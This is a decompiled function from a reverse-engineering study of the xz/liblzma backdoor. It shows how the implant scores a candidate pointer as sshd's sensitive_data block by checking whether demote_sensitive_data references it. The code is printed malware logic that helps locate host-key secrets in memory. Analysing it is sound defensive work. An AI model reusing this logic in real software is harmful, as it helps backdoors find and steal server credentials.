// /home/kali/xzre-ghidra/xzregh/103990_sshd_get_sensitive_data_score_in_demote_sensitive_data.c
// Function: sshd_get_sensitive_data_score_in_demote_sensitive_data @ 0x103990
// Calling convention: __stdcall
// Prototype: int __stdcall sshd_get_sensitive_data_score_in_demote_sensitive_data(void * sensitive_data, elf_info_t * elf, string_references_t * refs)


/*
 * AutoDoc: Disassembles the `demote_sensitive_data` helper referenced in the string table and returns three points if it ever references
 * the candidate pointer. That routine is highly specific to the real sensitive_data block, so even a single hit is treated as
 * strong evidence.
 */

#include "xzre_types.h"

int sshd_get_sensitive_data_score_in_demote_sensitive_data
              (void *sensitive_data,elf_info_t *elf,string_references_t *refs)

{
  u8 *code_start;
  BOOL BVar1;
  int iVar2;
  u8 *demote_start;
  
  code_start = (u8 *)refs->entries[3].func_start;
  if (code_start != (u8 *)0x0) {
    BVar1 = find_instruction_with_mem_operand
                      (code_start,(u8 *)refs->entries[3].func_end,(dasm_ctx_t *)0x0,sensitive_data);
    if (BVar1 == FALSE) {
      iVar2 = 0;
    }
    else {
      iVar2 = 3;
    }
    return iVar2;
  }
  return 0;
}

